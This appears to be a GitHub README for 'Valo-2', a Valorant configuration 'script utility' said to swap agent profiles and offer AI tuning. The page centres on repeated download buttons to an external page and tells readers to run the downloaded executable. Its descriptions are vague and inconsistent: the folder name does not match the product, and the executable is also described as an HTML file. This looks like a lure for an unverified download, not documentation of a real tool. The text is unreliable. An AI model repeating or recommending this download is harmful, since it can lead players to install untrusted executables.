# Valo-2 - Game Script Utility 2026

> **Valorant configuration orchestrator** - Handle agent profiles, crosshair setups, sensitivity presets, and utility binds with AI-assisted tuning.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Windows%2C%20macOS%2C%20Linux-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/wardbrandon85/valo2-script-utility?style=flat-square)](https://github.com/wardbrandon85/valo2-script-utility)

---

<p align="center">
  <a href="https://wardbrandon85.github.io/valo2-script-utility/">
    <img src="https://img.shields.io/badge/Download-Valo-2%20Script-brightgreen?style=for-the-badge" alt="Download Valo-2 Script">
  </a>
</p>

> **[Direct Download - Valo-2](https://wardbrandon85.github.io/valo2-script-utility/)**

---

[Download Latest Build](https://wardbrandon85.github.io/valo2-script-utility/)

---

## What it does

Valo-2 is built to coordinate Valorant settings from one place. It gives you a way to keep separate agent profiles and move between them without manually reworking crosshair, sensitivity, or utility bindings every time you change characters. The interface is responsive, so it remains usable across different display sizes, whether you're on a desktop monitor or a more compact setup.

The 2026 release adds AI connectivity via OpenAI and Claude APIs. With that enabled, the script can review your performance logs and offer configuration ideas based on the results it has recorded. It watches for patterns in the settings you use and can surface adjustments for your agent profiles. Changes stay inside configuration limits, and fallback defaults are there so your core setup remains accessible.

---

## Core capabilities

- **Agent Fingerprint Profiles** - Keep full setting snapshots per agent, including crosshair placement, sensitivity multiplier, and utility key mapping
- **Real-time Profile Swapping** - Move between agent configurations immediately during agent select or between rounds without relaunching the game
- **Responsive UI** - The layout adapts cleanly to monitors, laptops, and tablets while keeping the full feature set available at any resolution
- **Multilingual Support** - UI text and documentation are provided in multiple languages for players around the world
- **OpenAI & Claude API Integration** - Optional AI help reviews performance logs and proposes refinements to your profiles
- **Performance Logs** - Captures session details such as accuracy, ability timing, and sensitivity changes for later analysis
- **Failsafe Defaults** - Restores base settings automatically if a profile becomes damaged or no longer fits a game update

---

## Getting started

1. Download the latest build from the link above
2. Extract the contents to a dedicated folder (suggested: `valo-strategic-tracker`)
3. Run the main executable or open the HTML file in your browser
4. Configure your first agent profile through the interface

Minimal example for loading a saved profile:
```json
{
  "agent": "Jett",
  "crosshair": "custom_1",
  "sensitivity": 0.45,
  "utility_binds": ["Q", "E", "C", "X"]
}
```

---

## Configuration options

| Setting | Default | Description |
|---------|---------|-------------|
| `hotkey_swap` | `F4` | Key combination to trigger profile swap |
| `ai_suggestions` | `false` | Enable or disable AI-powered recommendations |
| `log_performance` | `true` | Toggle session data recording |
| `language` | `en` | Interface language code |
| `auto_backup` | `true` | Automatically save profiles before each update |

---

## Compatibility

- **Supported platforms:** Windows, macOS, Linux
- **Game version:** Valorant (all current patches as of 2026)
- **Browser support:** Chrome, Firefox, Edge, Safari (for HTML version)
- **Known limitation:** AI integration requires active API keys and internet connection; profile swapping may need game window focus

---

## Common questions

**How do I set up my first agent profile?**  
Open the interface, pick an agent from the dropdown, adjust crosshair and sensitivity, then save the fingerprint. The script keeps those settings and applies them when you choose that agent in-game.

**Will updates break my saved profiles?**  
The failsafe defaults system automatically reverts incompatible profiles. You can also export your profiles as JSON files before updating.

**Can I customize the hotkey for profile swapping?**  
Yes, navigate to the Options section and change the `hotkey_swap` value to any supported key combination.

**Does this work with the latest Valorant patch?**  
The script updates regularly to maintain compatibility. Check the download page for the latest version notes.

**Where are my performance logs stored?**  
Logs are saved locally in the script's folder as CSV files. You can disable logging in the Options menu.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
